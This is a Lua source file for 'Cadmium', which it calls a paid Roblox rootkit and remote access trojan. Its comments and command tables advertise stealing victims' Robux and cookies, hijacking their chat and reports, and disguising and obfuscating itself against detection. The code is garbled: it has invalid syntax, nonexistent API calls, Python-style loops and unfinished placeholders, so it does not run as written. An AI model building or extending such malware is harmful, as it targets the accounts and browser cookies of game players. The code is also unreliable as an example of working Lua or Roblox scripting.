-- CADMIUM --
-- Roblox Rootkit/Remote Access Trojan --
-- What is Cadmium? --
-- Cadmium is a ROBLOX Rootkit/Remote Access Trojan. It hooks onto a player using a remote event and then allows you to completely --
-- take control of the victim's robux value, cookies, reporting functions, chat and execute serverside mods on them. -- 
-- If you have purchased Cadmium for $2 USD, you abide by the Terms Of Service. Visit https://cadmium.rip/TOS for more --
-- TODO: cadmium.rip website --
-- NOTICE THIS IS THE ADMIN CONTROLLING MODULE. THE INFECTION MODULE IS NOT DONE YET. --
-- To pull all lists of your victims, declare game:CadVictims(all) --
-- to disguise Cadmium as a legitimate exploit turn on "disguise" --
-- disguise forms: synx, proto, sirhurt, bitwiseop --
-- AutoObfuscate automatically obfuscates your code using Ironbrew. It is still VULNERABLE to constant dumping. --
-- todo: metamethod hooking fix --
-- todo: obfuscation engine optimize code, ensure bitwise operators and opcode is faster than the default wait 0.5 function --

_G.KillSwitch = "true"
_G.AutoObfuscate = "true"
_G.Disguise = "false, "

local Username = game.Players:GetService("GameService").Your Name Here -- input your name here
-- Written by trickster and Stravant
-- UI Design for disguising written by Harkinian and stommy 
local all = game.Workspace:GetAllChildren()
local owner = game.Players:("GameService").[Username] -- put your username here to be whitelisted to Cadmium.
local controls = {
["Victim Commands"] = "fly", "kick", "kill", "freeze", "punish", "swagify", "bully", "kidnap", "iloveyou" -- default victim commands for disguising
["Owner Commands"] = "seewindow", "robuxsteal", "cookiesteal", "all", "reportthyself", "say", "requiremodule"
}
-- metatable conversion unneccessary, metamethods unneccessary, optimization complete
for i,v in pairs(controls) do
rconsoleprint(i,v)
end  --prints on a custom console window

-- defining all for global function
all = game.Workspace:GetDescendants()
for i,v in next, all do
if v.Type == "BooleanValue" then
rconsoleprint("Victims logged.")
end

-- CadVictim Function --
-- Written by Stravant --
function CadVictims(all)
 for x in range(all) do 
 rconsoleprint(x)
end)

-- Rootkit Victim Table Creation
-- Metamethods Used: index, div
-- victimtable is a metatable that you can use later to print out the list of your victims and their status (if they are hooked or not)
local victimtable = {__index = all}
local function victimprinttable.__div(all)
 if (type(all) == "Text") then 
 print("hooked!")
elseif (type(all) == "Number") then
 print("hook failed, victims don't exist.") 
elseif (type(all) == "Number" and "Text") then 
 print("hooked! username contains text and number.")
end 
--[[ reiteration of victimtable index metamethod ]] --
-- return __index
-- for i,v in next, victimtable do
--   return i
--   hookfunction(victimtable) == {__index = all}
--   print(i,v)
-- end 


-- todo: cadmium infection module 
-- Cadmium Infection Module
-- Written by trickster
local inftf = Instance.new("BooleanValue")
for _,x in next, game.Workspace.Players do 
    if x.Name == "inftf" and x.Type == "BooleanValue" then
        print("victim is infected")
        victimtable.add(x)
    end 
end 

local infected = Instance.new("RemoteEvent", game.Workspace.ReplicatedStorage)
local function eventtriggeroninfected(infected)
    if (eventtriggeroninfected = true)
    return "hooked!"
elseif (eventtriggeroninfected ~= victimtable{__index})
    return "victim isn't infected"
end 

eventtriggeroninfected(connect(function)
    game.Workspace.ReplicatedStorage.infected:FireServer()
end 

-- todo: ensure privacy between client events, create remote function (stravant)
-- todo: secure remote events with 16-bit endian key encryption (stravant)
local id = game:GetService("ThirdPartyAssetsService")
if rconsoleinput == ("requiremodule", id) 
 wait(2)
rconsoleprint("executing script...")
 wait(0.2)
require(requiremodule, id)
end -- todo: getfenv() on game env to ensure anticheat doesn't return garbage collection
for i,v in pairs(id) do -- i for indexing, v for value
    getfenv(id)
end)   
-- metatable management --
---------------------------
-- written by trickster --

for _,x in pairs(victimtable) do 
    return __index -- index metamethod parented to victim table mt
else
    return _ 
    print("metamethod unhooked???? what the fuck")
elseif {__index} = mt.Torque(math.pow*math.huge) then
    return x 
    hookmetamethod(__concat, __index, __div{a,b}) 
    return __div({[__namecall()]})
end 
-- metamethod hooking
for x in range(victimtable.append{__concat, __index, __div, __namecall}) do 
    hookmetamethod(x, all)
    wait(3)
    return x 
end 
-- synapse exclusive function
-- stravant writes the rest of the metamethod code

-- game upvalue management --
-- synapse only debug function called
debug.getupvalues(all, math.huge)
-- end game upvalue management --

-- locales --
local _G.Disguise = false 
else 
    _G.Disguise = true 
hookfunction(_G.Disguise.Instance.new(... "ScreenGui", const, proto, workspace))
if _G.Diguise = true 
return hookfunction()
-- Input your ScreenGuis here --




end)
end 

-- networkownership intiialize --
game:GetService("RunService").Heartbeat:connect(function()
-- synapse only function initialize
-- in.
checkclient(synapse)
if debug.client == false and return "Error" then 
    print("get synapse")
else
    sethiddenproperty(MaximumSimulationRadius, SimulationRadius) --expalanation: sethiddenproperty function is synapse exclusive
end 

-- todo: auto obfuscate code using ironbrew fork 
--todo: optimize indexing method for function declaration
-- i,v is the default index and value variable 
